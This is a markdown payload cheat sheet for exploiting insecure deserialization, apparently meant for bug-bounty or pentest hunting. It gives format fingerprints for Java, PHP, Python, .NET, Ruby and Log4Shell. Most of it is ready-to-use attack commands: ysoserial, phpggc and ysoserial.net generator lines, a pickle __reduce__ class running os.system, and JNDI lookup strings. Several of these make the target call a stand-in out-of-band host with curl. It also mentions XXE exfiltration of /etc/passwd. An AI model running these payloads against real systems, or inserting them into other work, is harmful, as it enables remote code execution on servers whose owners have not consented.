# Insecure Deserialization — payload reference

> Class: RCE via deserialization of attacker-controlled data (almost always Critical — a direct path to
> command execution with no preconditions). Workflow: **fingerprint the format → pick a gadget chain for the
> classpath/dependencies → OOB probe → full PoC**. The mere presence of a serialized object in a cookie/body
> != confirmation — you need a crafted payload with an OOB callback.

## Fingerprint (what is in the stream)

- **Java**: magic `AC ED 00 05` (hex) / `rO0A` (base64); `Content-Type: application/x-java-serialized-object`;
  a cookie with `rO0=`; Apache Shiro `Set-Cookie: rememberMe=`; endpoints `/wls-wsat/`,
  `/invoker/`, `/remoting/`, `/jmx-console/`.
- **PHP**: the `O:8:"stdClass":0:{}` pattern; `unserialize(` in the source; a phar context.
- **Python pickle**: starts with `\x80\x04` (proto 4) / `\x80\x02`.
- **.NET**: `__VIEWSTATE` without `__VIEWSTATEENCRYPTED`; `BinaryFormatter`/`ObjectStateFormatter`/
  `JSON.NET TypeNameHandling`.
- **Ruby**: `Marshal.load`/`Marshal.restore` in the source; base64-Marshal in a cookie/param.

## Payloads

- **Java — ysoserial gadget-chains**: pick a chain matching the target's dependencies
  (`CommonsCollections6`, `CommonsCollections5`, `Spring1/2`, `Groovy1`, `ROME`, `Hibernate`).
  OOB probe: `java -jar ysoserial-all.jar CommonsCollections6 'curl http://COLLAB/y' | base64 -w0` →
  into the body/cookie with `Content-Type: application/x-java-serialized-object`. Shiro: default-AES-key
  exploit (`shiro_exploit.py`). WebLogic: `/wls-wsat/CoordinatorPortType`.
  - Detection Signal: an OOB DNS/HTTP hit on the Collaborator (blind RCE confirmed) OR the command output in
    the response (full RCE). A change in error behavior between a valid-vs-broken gadget = deserialization is active.
- **PHP — object injection (`__wakeup`/`__destruct`)**: probe
  `O:8:"stdClass":1:{s:4:"test";s:5:"value";}` in a cookie/POST/hidden field → an error change = a sink was
  found. Gadget: `phpggc` per framework — `phpggc Laravel/RCE5 system id | base64`,
  `Monolog/RCE`, `Symfony/*`, `CodeIgniter4/*`, `Guzzle/*`. Polyglot JPEG+PHAR → `phar://` on a sink with
  `file_exists()`/`file_get_contents()`.
  - Detection Signal: command output in the response/OOB; or a change in the unserialize error on a crafted object.
- **Python — pickle `__reduce__`**: a class with
  `def __reduce__(self): return (os.system, ('curl http://COLLAB/p',))` →
  `base64.b64encode(pickle.dumps(Exploit()))` → into a cookie / an `Content-Type: application/octet-stream`
  body. Often ML endpoints (`/load-model`), sessions, caches.
  - Detection Signal: an OOB hit / `id` output — RCE in the process context.
- **.NET — BinaryFormatter / ViewState / JSON.NET TypeNameHandling**: ViewState without a MAC (no
  `__VIEWSTATEMAC`, a leaked `<machineKey>`) →
  `ysoserial.net -p ViewState -g TypeConfuseDelegate -c "cmd /c curl http://COLLAB/vs" ...`.
  BinaryFormatter/LosFormatter → `-f BinaryFormatter -g TypeConfuseDelegate`. JSON.NET with
  `TypeNameHandling.All`/`Auto` → inject `$type` into the JSON body for an RCE gadget (`System.Windows.Data.
  ObjectDataProvider`).
  - Detection Signal: an OOB/command output as the IIS worker; for JSON.NET — `$type` deserializes into the
    attacker class.
- **Ruby — Marshal.load gadget**: `Marshal.load(base64_decode(attacker))` → a chain on
  `Gem::Requirement`/`Gem::Installer`/`Gem::Source::Git` (a universal RCE gadget from ruby-advisory-db).
  A Rails cookie if `secret_key_base` leaked → forge a Marshal payload.
  - Detection Signal: an OOB/command output.
- **JNDI / Log4Shell** (a deserialization equivalent — server class-load without verification): fuzz
  user-controlled fields `${jndi:dns://COLLAB/$FIELD}` across headers (User-Agent, X-Forwarded-For,
  Referer, Accept-Language) and JSON fields; escalate `ldap://COLLAB/a` → a JNDI-Exploit-Kit class-load.
  - Detection Signal: a DNS hit on the Collaborator with the name of the injected field = a vulnerable sink;
    LDAP→class-load = RCE.

## Chain / framework playbooks

- **JWT `alg:none` / weak-HMAC** — a deserialization equivalent (the server "deserializes" identity without an
  integrity check). See `jwt.md`.
- **XXE↔deserialization** — a SOAP endpoint: XXE exfiltration of `/etc/passwd` + an XStream/Java-XML-deser
  sink. See `xxe.md`.
- Framework specifics (Laravel/Symfony gadgets, ASP.NET ViewState, Rails cookie) — pull from the corresponding
  hunt playbooks; here it's the fingerprint→gadget bridge.

## Anti-FP / what NOT to submit on its own

- **A serialized header in a cookie != deserialization** — `rO0ABX`/`AC ED` in the stream does not prove the
  app deserializes it. Confirm with a crafted ysoserial payload + OOB.
- **A payload generated != an exploit** — you need a gadget actually present in the target's classpath/dependencies.
- **Do not cross-apply payloads across languages** (a Java payload on PHP `unserialize` is garbage).
- **A Content-Type mismatch** mutes it: Java usually requires `application/x-java-serialized-object`/
  `octet-stream`; check both base64 and raw encodings.
- **A WAF cuts known ysoserial signatures** — the bug may be live, but a custom gadget is needed.
